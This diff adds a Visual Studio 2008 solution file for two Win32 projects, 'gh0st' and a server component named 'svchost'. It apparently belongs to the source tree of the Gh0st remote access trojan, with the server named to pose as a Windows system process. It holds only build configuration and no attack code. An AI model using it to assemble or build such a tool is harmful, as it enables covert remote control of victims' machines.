@@ -1,0 +1,26 @@
+﻿
+Microsoft Visual Studio Solution File, Format Version 10.00
+# Visual Studio 2008
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "gh0st", "gh0st\gh0st.vcproj", "{F51EFBC1-1DE3-4BCD-B5BC-68AA7B8040C6}"
+EndProject
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "svchost", "Server\svchost\svchost.vcproj", "{F726DCCE-ED97-4E7E-8015-C7DA91A940C6}"
+EndProject
+Global
+	GlobalSection(SolutionConfigurationPlatforms) = preSolution
+		Console|Win32 = Console|Win32
+		Release|Win32 = Release|Win32
+	EndGlobalSection
+	GlobalSection(ProjectConfigurationPlatforms) = postSolution
+		{F51EFBC1-1DE3-4BCD-B5BC-68AA7B8040C6}.Console|Win32.ActiveCfg = Release|Win32
+		{F51EFBC1-1DE3-4BCD-B5BC-68AA7B8040C6}.Console|Win32.Build.0 = Release|Win32
+		{F51EFBC1-1DE3-4BCD-B5BC-68AA7B8040C6}.Release|Win32.ActiveCfg = Release|Win32
+		{F51EFBC1-1DE3-4BCD-B5BC-68AA7B8040C6}.Release|Win32.Build.0 = Release|Win32
+		{F726DCCE-ED97-4E7E-8015-C7DA91A940C6}.Console|Win32.ActiveCfg = Console|Win32
+		{F726DCCE-ED97-4E7E-8015-C7DA91A940C6}.Console|Win32.Build.0 = Console|Win32
+		{F726DCCE-ED97-4E7E-8015-C7DA91A940C6}.Release|Win32.ActiveCfg = Release|Win32
+		{F726DCCE-ED97-4E7E-8015-C7DA91A940C6}.Release|Win32.Build.0 = Release|Win32
+	EndGlobalSection
+	GlobalSection(SolutionProperties) = preSolution
+		HideSolutionNode = FALSE
+	EndGlobalSection
+EndGlobal
